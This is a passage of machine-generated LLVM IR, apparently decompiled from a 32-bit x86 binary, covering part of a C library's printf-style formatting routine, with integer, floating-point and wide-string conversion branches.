  %v0_804e901 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e901 = add i32 %v0_804e8e7, -12
  %v3_804e901 = inttoptr i32 %v2_804e901 to i32*
  store i32 %v0_804e901, i32* %v3_804e901, align 4
  %v0_804e902 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e902 = add i32 %v0_804e8e7, -16
  %v3_804e902 = inttoptr i32 %v2_804e902 to i32*
  store i32 %v0_804e902, i32* %v3_804e902, align 4
  %v0_804e903 = call i32 @_load_inttype()
  %v0_804e908 = load i32, i32* @ebx, align 4
  %v1_804e908 = load i32, i32* @esp, align 4
  %v2_804e908 = inttoptr i32 %v1_804e908 to i32*
  store i32 %v0_804e908, i32* %v2_804e908, align 4
  %v0_804e90b = load i32, i32* @esi, align 4
  %v1_804e90b = load i32, i32* @esp, align 4
  %v2_804e90b = add i32 %v1_804e90b, -4
  %v3_804e90b = inttoptr i32 %v2_804e90b to i32*
  store i32 %v0_804e90b, i32* %v3_804e90b, align 4
  %v0_804e90c = load i32, i32* @edx, align 4
  %v2_804e90c = add i32 %v1_804e90b, -8
  %v3_804e90c = inttoptr i32 %v2_804e90c to i32*
  store i32 %v0_804e90c, i32* %v3_804e90c, align 4
  %v2_804e90d = add i32 %v1_804e90b, -12
  %v3_804e90d = inttoptr i32 %v2_804e90d to i32*
  store i32 %v0_804e903, i32* %v3_804e90d, align 4
  %v1_804e90e = add i32 %v1_804e90b, 347
  store i32 %v1_804e90e, i32* %eax.global-to-local, align 4
  %v2_804e915 = add i32 %v1_804e90b, -16
  %v3_804e915 = inttoptr i32 %v2_804e915 to i32*
  store i32 %v1_804e90e, i32* %v3_804e915, align 4
  %v0_804e916 = load i32, i32* %stack_var_-364, align 4
  %v5_804e916 = inttoptr i32 %v0_804e916 to i8*
  %v6_804e916 = call i32 @_uintmaxtostr(i8* %v5_804e916, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e916, i32* %eax.global-to-local, align 4
  %v0_804e91b = load i32, i32* @esp, align 4
  %v1_804e91b = add i32 %v0_804e91b, 32
  %v1_804e91e = add i32 %v0_804e91b, 80
  %v2_804e91e = inttoptr i32 %v1_804e91e to i32*
  %v3_804e91e = load i32, i32* %v2_804e91e, align 4
  %v4_804e91e = add i32 %v3_804e91e, -5
  %v8_804e91e = icmp ult i32 %v3_804e91e, 5
  %v12_804e91e = icmp eq i32 %v4_804e91e, 0
  %v13_804e91e = icmp slt i32 %v4_804e91e, 0
  store i1 %v13_804e91e, i1* %sf.global-to-local, align 1
  store i32 %v6_804e916, i32* @edi, align 4
  %v2_804e925 = or i1 %v8_804e91e, %v12_804e91e
  br i1 %v2_804e925, label %dec_label_pc_804e94f, label %dec_label_pc_804e927

dec_label_pc_804e927:                             ; preds = %dec_label_pc_804e8ff
  %v7_804e916 = inttoptr i32 %v6_804e916 to i8*
  %v3_804e927 = load i8, i8* %v7_804e916, align 1
  %v4_804e927 = add i8 %v3_804e927, -45
  %v12_804e927 = icmp eq i8 %v4_804e927, 0
  %v13_804e927 = icmp slt i8 %v4_804e927, 0
  store i1 %v13_804e927, i1* %sf.global-to-local, align 1
  %v1_804e92a = icmp eq i1 %v12_804e927, false
  %v1_804e939 = add i32 %v0_804e91b, 64
  %v2_804e939 = inttoptr i32 %v1_804e939 to i32*
  %v3_804e939 = load i32, i32* %v2_804e939, align 4
  br i1 %v1_804e92a, label %dec_label_pc_804e939, label %dec_label_pc_804e92c

dec_label_pc_804e92c:                             ; preds = %dec_label_pc_804e927
  %v4_804e92c = or i32 %v3_804e939, 2
  store i32 %v4_804e92c, i32* %v2_804e939, align 4
  %v0_804e931 = load i32, i32* @edi, align 4
  %v1_804e931 = add i32 %v0_804e931, 1
  %v9_804e931 = icmp slt i32 %v1_804e931, 0
  store i1 %v9_804e931, i1* %sf.global-to-local, align 1
  store i32 %v1_804e931, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e94f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e94f

dec_label_pc_804e939:                             ; preds = %dec_label_pc_804e927
  store i32 %v3_804e939, i32* %eax.global-to-local, align 4
  %v2_804e93d = and i32 %v3_804e939, 2
  %v3_804e93d = icmp eq i32 %v2_804e93d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804e93d, label %dec_label_pc_804e945, label %dec_label_pc_804e941

dec_label_pc_804e941:                             ; preds = %dec_label_pc_804e939
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e94f

dec_label_pc_804e945:                             ; preds = %dec_label_pc_804e939
  %v2_804e945 = urem i32 %v3_804e939, 2
  %v3_804e945 = icmp eq i32 %v2_804e945, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804e94c = icmp eq i1 %v3_804e945, false
  %v2_804e94c = load i32, i32* @ebp, align 4
  %v4_804e94c = select i1 %v1_804e94c, i32 4, i32 %v2_804e94c
  store i32 %v4_804e94c, i32* @ebp, align 4
  br label %dec_label_pc_804e94f

dec_label_pc_804e94f:                             ; preds = %dec_label_pc_804e8ff, %dec_label_pc_804e941, %dec_label_pc_804e92c, %dec_label_pc_804e945
  %v0_804e9a1 = phi i32 [ %v6_804e916, %dec_label_pc_804e8ff ], [ %v6_804e916, %dec_label_pc_804e941 ], [ %v1_804e931, %dec_label_pc_804e92c ], [ %v6_804e916, %dec_label_pc_804e945 ]
  %v0_804e9b1 = phi i32 [ %v1_804e91b, %dec_label_pc_804e8ff ], [ %v1_804e91b, %dec_label_pc_804e941 ], [ %v0_804e94f.pre, %dec_label_pc_804e92c ], [ %v1_804e91b, %dec_label_pc_804e945 ]
  %v1_804e94f = add i32 %v0_804e9b1, 20
  %v2_804e94f = inttoptr i32 %v1_804e94f to i32*
  %v3_804e94f = load i32, i32* %v2_804e94f, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804e953 = sub i32 204, %v0_804e9a1
  %v2_804e95f = add i32 %v1_804e953, %v0_804e9b1
  %v1_804e961 = add i32 %v2_804e95f, 127
  store i32 %v1_804e961, i32* @esi, align 4
  %v2_804e964 = icmp slt i32 %v3_804e94f, 0
  store i1 %v2_804e964, i1* %sf.global-to-local, align 1
  %v3_804e966 = select i1 %v2_804e964, i32 1, i32 %v3_804e94f
  store i32 %v3_804e966, i32* %ecx.global-to-local, align 4
  %v1_804e969 = add i32 %v0_804e9b1, 32
  %v2_804e969 = inttoptr i32 %v1_804e969 to i8*
  %v3_804e969 = load i8, i8* %v2_804e969, align 1
  %v4_804e969 = and i8 %v3_804e969, 16
  %v5_804e969 = icmp eq i8 %v4_804e969, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804e969, label %dec_label_pc_804e9a1, label %dec_label_pc_804e970

dec_label_pc_804e970:                             ; preds = %dec_label_pc_804e94f
  %v1_804e970 = add i32 %v0_804e9b1, 48
  %v2_804e970 = inttoptr i32 %v1_804e970 to i32*
  %v3_804e970 = load i32, i32* %v2_804e970, align 4
  store i32 %v3_804e970, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i32 %v3_804e970, 3
  %v3_804e979 = load i32, i32* @ebp, align 4
  %v5_804e979 = select i1 %tmp69, i32 6, i32 %v3_804e979
  store i32 %v5_804e979, i32* @ebp, align 4
  %v1_804e97c = add i32 %v3_804e970, -3
  %v9_804e97c = icmp eq i32 %v1_804e97c, 0
  %v10_804e97c = icmp slt i32 %v1_804e97c, 0
  store i1 %v10_804e97c, i1* %sf.global-to-local, align 1
  %v1_804e97f = icmp eq i1 %v9_804e97c, false
  br i1 %v1_804e97f, label %dec_label_pc_804e988, label %dec_label_pc_804e981

dec_label_pc_804e981:                             ; preds = %dec_label_pc_804e970
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e9a1

dec_label_pc_804e988:                             ; preds = %dec_label_pc_804e970
  %v1_804e988 = add i32 %v3_804e970, -4
  %v9_804e988 = icmp eq i32 %v1_804e988, 0
  %v10_804e988 = icmp slt i32 %v1_804e988, 0
  store i1 %v10_804e988, i1* %sf.global-to-local, align 1
  %v1_804e98b = icmp eq i1 %v9_804e988, false
  br i1 %v1_804e98b, label %dec_label_pc_804e9a1, label %dec_label_pc_804e98d

dec_label_pc_804e98d:                             ; preds = %dec_label_pc_804e988
  %v2_804e98d = sub i32 %v3_804e966, %v1_804e961
  %v7_804e98d = icmp ult i32 %v3_804e966, %v1_804e961
  %v12_804e98d = icmp eq i32 %v2_804e98d, 0
  %v13_804e98d = icmp slt i32 %v2_804e98d, 0
  store i1 %v13_804e98d, i1* %sf.global-to-local, align 1
  %v2_804e98f = or i1 %v7_804e98d, %v12_804e98d
  br i1 %v2_804e98f, label %dec_label_pc_804e991, label %dec_label_pc_804e9a1

dec_label_pc_804e991:                             ; preds = %dec_label_pc_804e98d
  %v1_804e991 = inttoptr i32 %v0_804e9a1 to i8*
  %v2_804e991 = load i8, i8* %v1_804e991, align 1
  %v3_804e991 = add i8 %v2_804e991, -48
  %v8_804e991 = icmp eq i8 %v3_804e991, 0
  %v9_804e991 = icmp slt i8 %v3_804e991, 0
  store i1 %v9_804e991, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804e991, label %dec_label_pc_804e9a1, label %dec_label_pc_804e99b

dec_label_pc_804e99b:                             ; preds = %dec_label_pc_804e991
  %v1_804e99b = add i32 %v2_804e95f, 128
  store i32 %v1_804e99b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e9a1

dec_label_pc_804e9a1:                             ; preds = %dec_label_pc_804e98d, %dec_label_pc_804e991, %dec_label_pc_804e988, %dec_label_pc_804e94f, %dec_label_pc_804e981, %dec_label_pc_804e99b
  %v0_804e9da = phi i32 [ %v3_804e966, %dec_label_pc_804e98d ], [ 1, %dec_label_pc_804e991 ], [ %v3_804e966, %dec_label_pc_804e988 ], [ %v3_804e966, %dec_label_pc_804e94f ], [ %v3_804e966, %dec_label_pc_804e981 ], [ %v1_804e99b, %dec_label_pc_804e99b ]
  %v1_804e9a1 = inttoptr i32 %v0_804e9a1 to i8*
  %v2_804e9a1 = load i8, i8* %v1_804e9a1, align 1
  %v3_804e9a1 = add i8 %v2_804e9a1, -48
  %v8_804e9a1 = icmp eq i8 %v3_804e9a1, 0
  %v9_804e9a1 = icmp slt i8 %v3_804e9a1, 0
  store i1 %v9_804e9a1, i1* %sf.global-to-local, align 1
  %v1_804e9a4 = icmp eq i1 %v8_804e9a1, false
  br i1 %v1_804e9a4, label %dec_label_pc_804e9d2, label %dec_label_pc_804e9a6

dec_label_pc_804e9a6:                             ; preds = %dec_label_pc_804e9a1
  %v0_804e9a6 = load i32, i32* @ebp, align 4
  %v1_804e9a6 = add i32 %v0_804e9a6, -6
  %v6_804e9a6 = sub i32 5, %v0_804e9a6
  %v7_804e9a6 = and i32 %v6_804e9a6, %v0_804e9a6
  %v8_804e9a6 = icmp slt i32 %v7_804e9a6, 0
  %v10_804e9a6 = icmp slt i32 %v1_804e9a6, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804e9ae = icmp eq i1 %v10_804e9a6, %v8_804e9a6
  %v5_804e9ae = select i1 %v2_804e9ae, i32 11, i32 %v0_804e9a6
  store i32 %v5_804e9ae, i32* @ebp, align 4
  %v1_804e9b1 = add i32 %v0_804e9b1, 48
  %v2_804e9b1 = inttoptr i32 %v1_804e9b1 to i32*
  %v3_804e9b1 = load i32, i32* %v2_804e9b1, align 4
  %v4_804e9b1 = add i32 %v3_804e9b1, -1
  %v12_804e9b1 = icmp eq i32 %v4_804e9b1, 0
  %v13_804e9b1 = icmp slt i32 %v4_804e9b1, 0
  store i1 %v13_804e9b1, i1* %sf.global-to-local, align 1
  %v1_804e9b6 = icmp eq i1 %v12_804e9b1, false
  br i1 %v1_804e9b6, label %dec_label_pc_804e9c7, label %dec_label_pc_804e9b8

dec_label_pc_804e9b8:                             ; preds = %dec_label_pc_804e9a6
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8057338.165 to i32), i32* @edi, align 4
  br label %dec_label_pc_804eb51

dec_label_pc_804e9c7:                             ; preds = %dec_label_pc_804e9a6
  %v1_804e9c7 = icmp eq i32 %v0_804e9da, 0
  %v2_804e9c7 = icmp slt i32 %v0_804e9da, 0
  store i1 %v2_804e9c7, i1* %sf.global-to-local, align 1
  %v1_804e9c9 = icmp eq i1 %v1_804e9c7, false
  br i1 %v1_804e9c9, label %dec_label_pc_804e9d2, label %dec_label_pc_804e9cb

dec_label_pc_804e9cb:                             ; preds = %dec_label_pc_804e9c7
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804eb51

dec_label_pc_804e9d2:                             ; preds = %dec_label_pc_804e9c7, %dec_label_pc_804e9a1
  %v2_804e9d2 = sub i32 %v0_804e9da, %v1_804e961
  %v7_804e9d2 = icmp ult i32 %v0_804e9da, %v1_804e961
  %v12_804e9d2 = icmp eq i32 %v2_804e9d2, 0
  %v13_804e9d2 = icmp slt i32 %v2_804e9d2, 0
  store i1 %v13_804e9d2, i1* %sf.global-to-local, align 1
  %v2_804e9d4 = or i1 %v7_804e9d2, %v12_804e9d2
  br i1 %v2_804e9d4, label %dec_label_pc_804eb51, label %dec_label_pc_804e9da

dec_label_pc_804e9da:                             ; preds = %dec_label_pc_804e9d2
  store i1 %v13_804e9d2, i1* %sf.global-to-local, align 1
  store i32 %v2_804e9d2, i32* @ebx, align 4
  br label %dec_label_pc_804eb6b

dec_label_pc_804e9e3:                             ; preds = %dec_label_pc_804e876
  %v1_804e9e3 = add i32 %v3_804e848, -15
  %v5_804e9e3 = icmp ult i32 %v3_804e848, 15
  %v9_804e9e3 = icmp eq i32 %v1_804e9e3, 0
  %v10_804e9e3 = icmp slt i32 %v1_804e9e3, 0
  store i1 %v10_804e9e3, i1* %sf.global-to-local, align 1
  %v2_804e9e6 = or i1 %v5_804e9e3, %v9_804e9e3
  br i1 %v2_804e9e6, label %dec_label_pc_804e9e8, label %dec_label_pc_804ea2d

dec_label_pc_804e9e8:                             ; preds = %dec_label_pc_804e9e3
  %v1_804e9e8 = add i32 %v0_804e848.lcssa, 33
  %v2_804e9e8 = inttoptr i32 %v1_804e9e8 to i8*
  %v3_804e9e8 = load i8, i8* %v2_804e9e8, align 1
  %v4_804e9e8 = and i8 %v3_804e9e8, 8
  %v5_804e9e8 = icmp eq i8 %v4_804e9e8, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e9ed = add i32 %v0_804e848.lcssa, 344
  %v2_804e9ed = inttoptr i32 %v1_804e9ed to i32*
  %v3_804e9ed = load i32, i32* %v2_804e9ed, align 4
  store i32 %v3_804e9ed, i32* %edx.global-to-local, align 4
  br i1 %v5_804e9e8, label %dec_label_pc_804e9fa, label %dec_label_pc_804e9f6

dec_label_pc_804e9f6:                             ; preds = %dec_label_pc_804e9e8
  %v1_804e9f6 = inttoptr i32 %v3_804e9ed to x86_fp80*
  %v2_804e9f6 = load x86_fp80, x86_fp80* %v1_804e9f6, align 4
  br label %dec_label_pc_804e9fc

dec_label_pc_804e9fa:                             ; preds = %dec_label_pc_804e9e8
  %v1_804e9fa = inttoptr i32 %v3_804e9ed to double*
  %v2_804e9fa = load double, double* %v1_804e9fa, align 4
  %v3_804e9fa = fpext double %v2_804e9fa to x86_fp80
  br label %dec_label_pc_804e9fc

dec_label_pc_804e9fc:                             ; preds = %dec_label_pc_804e9f6, %dec_label_pc_804e9fa
  %storemerge4 = phi x86_fp80 [ %v2_804e9f6, %dec_label_pc_804e9f6 ], [ %v3_804e9fa, %dec_label_pc_804e9fa ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804e9fc = load i32, i32* @esi, align 4
  %v2_804e9fc = add i32 %v0_804e848.lcssa, -4
  %v3_804e9fc = inttoptr i32 %v2_804e9fc to i32*
  store i32 %v0_804e9fc, i32* %v3_804e9fc, align 4
  %v0_804e9fd = load i32, i32* @esi, align 4
  %v2_804e9fd = add i32 %v0_804e848.lcssa, -8
  %v3_804e9fd = inttoptr i32 %v2_804e9fd to i32*
  store i32 %v0_804e9fd, i32* %v3_804e9fd, align 4
  %v1_804e9fe = add i32 %v0_804e848.lcssa, -12
  %v2_804e9fe = inttoptr i32 %v1_804e9fe to i32*
  store i32 134538942, i32* %v2_804e9fe, align 4
  %v1_804ea03 = add i32 %v0_804e848.lcssa, 20
  store i32 %v1_804ea03, i32* %eax.global-to-local, align 4
  %v2_804ea07 = add i32 %v0_804e848.lcssa, -16
  %v3_804ea07 = inttoptr i32 %v2_804ea07 to i32*
  store i32 %v1_804ea03, i32* %v3_804ea07, align 4
  %v1_804ea08 = add i32 %v0_804e848.lcssa, -28
  %v10_804ea08 = icmp slt i32 %v1_804ea08, 0
  store i1 %v10_804ea08, i1* %sf.global-to-local, align 1
  %v1_804ea0b = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804ea0b = inttoptr i32 %v1_804ea08 to x86_fp80*
  store x86_fp80 %v1_804ea0b, x86_fp80* %v3_804ea0b, align 4
  %v1_804ea0e = add i32 %v0_804e848.lcssa, 368
  %v2_804ea0e = inttoptr i32 %v1_804ea0e to i32*
  %v3_804ea0e = load i32, i32* %v2_804ea0e, align 4
  %v5_804ea0e = add i32 %v0_804e848.lcssa, -32
  %v6_804ea0e = inttoptr i32 %v5_804ea0e to i32*
  store i32 %v3_804ea0e, i32* %v6_804ea0e, align 4
  %v0_804ea15 = call i32 @_fpmaxtostr()
  store i32 %v0_804ea15, i32* %eax.global-to-local, align 4
  %v0_804ea1a = load i32, i32* @esp, align 4
  %v1_804ea1a = add i32 %v0_804ea1a, 32
  %v2_804ea1d = icmp slt i32 %v0_804ea15, 0
  store i1 %v2_804ea1d, i1* %sf.global-to-local, align 1
  br i1 %v2_804ea1d, label %dec_label_pc_804eccb, label %dec_label_pc_804ea25

dec_label_pc_804ea25:                             ; preds = %dec_label_pc_804e9fc
  %v1_804ea25 = inttoptr i32 %v1_804ea1a to i32*
  %v2_804ea25 = load i32, i32* %v1_804ea25, align 4
  %v4_804ea25 = add i32 %v2_804ea25, %v0_804ea15
  %v15_804ea25 = icmp slt i32 %v4_804ea25, 0
  store i1 %v15_804ea25, i1* %sf.global-to-local, align 1
  store i32 %v4_804ea25, i32* %v1_804ea25, align 4
  %v0_804ecb8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ecb8

dec_label_pc_804ea2d:                             ; preds = %dec_label_pc_804e9e3
  %v1_804ea2d = add i32 %v3_804e848, -17
  %v5_804ea2d = icmp ult i32 %v3_804e848, 17
  %v9_804ea2d = icmp eq i32 %v1_804ea2d, 0
  %v10_804ea2d = icmp slt i32 %v1_804ea2d, 0
  store i1 %v10_804ea2d, i1* %sf.global-to-local, align 1
  %v2_804ea30 = or i1 %v5_804ea2d, %v9_804ea2d
  br i1 %v2_804ea30, label %dec_label_pc_804ea36, label %dec_label_pc_804eaca

dec_label_pc_804ea36:                             ; preds = %dec_label_pc_804ea2d
  %v1_804ea36 = add i32 %v0_804e848.lcssa, 332
  %v2_804ea36 = inttoptr i32 %v1_804ea36 to i32*
  store i32 0, i32* %v2_804ea36, align 4
  %v0_804ea41 = load i32, i32* @esp, align 4
  %v1_804ea41 = add i32 %v0_804ea41, 344
  %v2_804ea41 = inttoptr i32 %v1_804ea41 to i32*
  %v3_804ea41 = load i32, i32* %v2_804ea41, align 4
  store i32 %v3_804ea41, i32* %edx.global-to-local, align 4
  %v1_804ea48 = icmp eq i1 %v9_804ea2d, false
  br i1 %v1_804ea48, label %dec_label_pc_804ea9a, label %dec_label_pc_804ea4a

dec_label_pc_804ea4a:                             ; preds = %dec_label_pc_804ea36
  %v1_804ea4a = inttoptr i32 %v3_804ea41 to i32*
  %v2_804ea4a = load i32, i32* %v1_804ea4a, align 4
  store i32 %v2_804ea4a, i32* %eax.global-to-local, align 4
  %v1_804ea4c = icmp eq i32 %v2_804ea4a, 0
  %v2_804ea4c = icmp slt i32 %v2_804ea4a, 0
  store i1 %v2_804ea4c, i1* %sf.global-to-local, align 1
  %v2_804ea4e = add i32 %v0_804ea41, 340
  %v3_804ea4e = inttoptr i32 %v2_804ea4e to i32*
  store i32 %v2_804ea4a, i32* %v3_804ea4e, align 4
  br i1 %v1_804ea4c, label %dec_label_pc_804eb55, label %dec_label_pc_804ea5b

dec_label_pc_804ea5b:                             ; preds = %dec_label_pc_804ea4a
  %v0_804ea5b = load i32, i32* @esp, align 4
  %v1_804ea5b = add i32 %v0_804ea5b, 20
  %v2_804ea5b = inttoptr i32 %v1_804ea5b to i32*
  %v3_804ea5b = load i32, i32* %v2_804ea5b, align 4
  %v1_804ea62 = add i32 %v0_804ea5b, 340
  store i32 %v1_804ea62, i32* %ecx.global-to-local, align 4
  %v2_804ea69 = icmp slt i32 %v3_804ea5b, 0
  store i1 %v2_804ea69, i1* %sf.global-to-local, align 1
  %v1_804ea6b = icmp eq i1 %v2_804ea69, false
  %v4_804ea6b = select i1 %v1_804ea6b, i32 %v3_804ea5b, i32 -1
  store i32 %v4_804ea6b, i32* %edx.global-to-local, align 4
  %v1_804ea6e = add i32 %v0_804ea5b, 332
  store i32 %v1_804ea6e, i32* %eax.global-to-local, align 4
  %v2_804ea75 = add i32 %v0_804ea5b, -4
  %v3_804ea75 = inttoptr i32 %v2_804ea75 to i32*
  store i32 %v1_804ea6e, i32* %v3_804ea75, align 4
  %v0_804ea76 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ea76 = add i32 %v0_804ea5b, -8
  %v3_804ea76 = inttoptr i32 %v2_804ea76 to i32*
  store i32 %v0_804ea76, i32* %v3_804ea76, align 4
  %v0_804ea77 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ea77 = add i32 %v0_804ea5b, -12
  %v3_804ea77 = inttoptr i32 %v2_804ea77 to i32*
  store i32 %v0_804ea77, i32* %v3_804ea77, align 4
  %v0_804ea78 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ea78 = add i32 %v0_804ea5b, -16
  %v3_804ea78 = inttoptr i32 %v2_804ea78 to i32*
  store i32 %v0_804ea78, i32* %v3_804ea78, align 4
  %v0_804ea79 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804ea79, i32* %eax.global-to-local, align 4
  %v0_804ea7e = load i32, i32* @esp, align 4
  %v1_804ea7e = add i32 %v0_804ea7e, 16
  %v1_804ea81 = add i32 %v0_804ea79, 1
  %v10_804ea81 = icmp eq i32 %v1_804ea81, 0
  %v11_804ea81 = icmp slt i32 %v1_804ea81, 0
  store i1 %v11_804ea81, i1* %sf.global-to-local, align 1
  store i32 %v0_804ea79, i32* @esi, align 4
  br i1 %v10_804ea81, label %dec_label_pc_804eccb, label %dec_label_pc_804ea8c

dec_label_pc_804ea8c:                             ; preds = %dec_label_pc_804ea5b
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804eb66

dec_label_pc_804ea9a:                             ; preds = %dec_label_pc_804ea36
  %v0_804ea9a = load i32, i32* @ebx, align 4
  %v2_804ea9a = add i32 %v0_804ea41, -4
  %v3_804ea9a = inttoptr i32 %v2_804ea9a to i32*
  store i32 %v0_804ea9a, i32* %v3_804ea9a, align 4
  %v1_804ea9b = add i32 %v0_804ea41, 332
  store i32 %v1_804ea9b, i32* %eax.global-to-local, align 4
  %v2_804eaa2 = add i32 %v0_804ea41, -8
  %v3_804eaa2 = inttoptr i32 %v2_804eaa2 to i32*
  store i32 %v1_804ea9b, i32* %v3_804eaa2, align 4
  %v0_804eaa3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eaa3 = inttoptr i32 %v0_804eaa3 to i32*
  %v2_804eaa3 = load i32, i32* %v1_804eaa3, align 4
  %v4_804eaa3 = add i32 %v0_804ea41, -12
  %v5_804eaa3 = inttoptr i32 %v4_804eaa3 to i32*
  store i32 %v2_804eaa3, i32* %v5_804eaa3, align 4
  %v1_804eaa5 = add i32 %v0_804ea41, 204
  store i32 %v1_804eaa5, i32* @edi, align 4
  %v2_804eaac = add i32 %v0_804ea41, -16
  %v3_804eaac = inttoptr i32 %v2_804eaac to i32*
  store i32 %v1_804eaa5, i32* %v3_804eaac, align 4
  %v0_804eaad = call i32 @__GI_wcrtomb()
  store i32 %v0_804eaad, i32* %eax.global-to-local, align 4
  %v0_804eab2 = load i32, i32* @esp, align 4
  %v1_804eab2 = add i32 %v0_804eab2, 16
  %v1_804eab5 = add i32 %v0_804eaad, 1
  %v10_804eab5 = icmp eq i32 %v1_804eab5, 0
  %v11_804eab5 = icmp slt i32 %v1_804eab5, 0
  store i1 %v11_804eab5, i1* %sf.global-to-local, align 1
  store i32 %v0_804eaad, i32* @esi, align 4
  br i1 %v10_804eab5, label %dec_label_pc_804eccb, label %dec_label_pc_804eac0

dec_label_pc_804eac0:                             ; preds = %dec_label_pc_804ea9a
  %v2_804eac0 = add i32 %v0_804eaad, 220
  %v3_804eac0 = add i32 %v2_804eac0, %v0_804eab2
  %v4_804eac0 = inttoptr i32 %v3_804eac0 to i8*
  store i8 0, i8* %v4_804eac0, align 1
  br label %dec_label_pc_804eaf8

dec_label_pc_804eaca:                             ; preds = %dec_label_pc_804ea2d
  %v1_804eaca = add i32 %v3_804e848, -19
  %v5_804eaca = icmp ult i32 %v3_804e848, 19
  %v9_804eaca = icmp eq i32 %v1_804eaca, 0
  %v10_804eaca = icmp slt i32 %v1_804eaca, 0
  store i1 %v10_804eaca, i1* %sf.global-to-local, align 1
  %v2_804eacd = or i1 %v5_804eaca, %v9_804eaca
  br i1 %v2_804eacd, label %dec_label_pc_804eacf, label %dec_label_pc_804eb27

dec_label_pc_804eacf:                             ; preds = %dec_label_pc_804eaca
  %v1_804eacf = add i32 %v0_804e848.lcssa, 344
  %v2_804eacf = inttoptr i32 %v1_804eacf to i32*
  %v3_804eacf = load i32, i32* %v2_804eacf, align 4
  store i32 %v3_804eacf, i32* %edx.global-to-local, align 4
  %v1_804ead6 = icmp eq i1 %v9_804eaca, false
  %v1_804eb01 = inttoptr i32 %v3_804eacf to i32*
  %v2_804eb01 = load i32, i32* %v1_804eb01, align 4
  br i1 %v1_804ead6, label %dec_label_pc_804eb01, label %dec_label_pc_804ead8

dec_label_pc_804ead8:                             ; preds = %dec_label_pc_804eacf
  store i32 %v2_804eb01, i32* @edi, align 4
  %v1_804eada = icmp eq i32 %v2_804eb01, 0
  %v2_804eada = icmp slt i32 %v2_804eb01, 0
  store i1 %v2_804eada, i1* %sf.global-to-local, align 1
  br i1 %v1_804eada, label %dec_label_pc_804eb55, label %dec_label_pc_804eade

dec_label_pc_804eade:                             ; preds = %dec_label_pc_804ead8, %dec_label_pc_804eb30
  %v1_804eae5 = phi i32 [ %v0_804e848.lcssa, %dec_label_pc_804ead8 ], [ %v1_804eb4a, %dec_label_pc_804eb30 ]
  %v1_804eade = add i32 %v1_804eae5, 20
  %v2_804eade = inttoptr i32 %v1_804eade to i32*
  %v3_804eade = load i32, i32* %v2_804eade, align 4
  store i32 %v3_804eade, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804eae5 = add i32 %v1_804eae5, -4
  %v3_804eae5 = inttoptr i32 %v2_804eae5 to i32*
  store i32 %v3_804e848, i32* %v3_804eae5, align 4
  %v2_804eae6 = add i32 %v1_804eae5, -8
  %v3_804eae6 = inttoptr i32 %v2_804eae6 to i32*
  store i32 %v3_804e848, i32* %v3_804eae6, align 4
  %v2_804eae7 = icmp slt i32 %v3_804eade, 0
  store i1 %v2_804eae7, i1* %sf.global-to-local, align 1
  %v1_804eae9 = icmp eq i1 %v2_804eae7, false
  %v2_804eae9 = load i32, i32* %eax.global-to-local, align 4
  %v4_804eae9 = select i1 %v1_804eae9, i32 %v3_804eade, i32 %v2_804eae9
  store i32 %v4_804eae9, i32* %eax.global-to-local, align 4
  %v2_804eaec = add i32 %v1_804eae5, -12
  %v3_804eaec = inttoptr i32 %v2_804eaec to i32*
  store i32 %v4_804eae9, i32* %v3_804eaec, align 4
  %v0_804eaed = load i32, i32* @edi, align 4
  %v2_804eaed = add i32 %v1_804eae5, -16
  %v3_804eaed = inttoptr i32 %v2_804eaed to i32*
  store i32 %v0_804eaed, i32* %v3_804eaed, align 4
  %v0_804eaee = call i32 @strnlen()
  store i32 %v0_804eaee, i32* %eax.global-to-local, align 4
  %v0_804eaf3 = load i32, i32* @esp, align 4
  %v1_804eaf3 = add i32 %v0_804eaf3, 16
  %v7_804eaf3 = icmp slt i32 %v1_804eaf3, 0
  store i1 %v7_804eaf3, i1* %sf.global-to-local, align 1
  store i32 %v0_804eaee, i32* @esi, align 4
  br label %dec_label_pc_804eaf8

dec_label_pc_804eaf8:                             ; preds = %dec_label_pc_804eac0, %dec_label_pc_804eade
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804eb66

dec_label_pc_804eb01:                             ; preds = %dec_label_pc_804eacf
  store i32 %v2_804eb01, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804eb0f = add i32 %v0_804e848.lcssa, 204
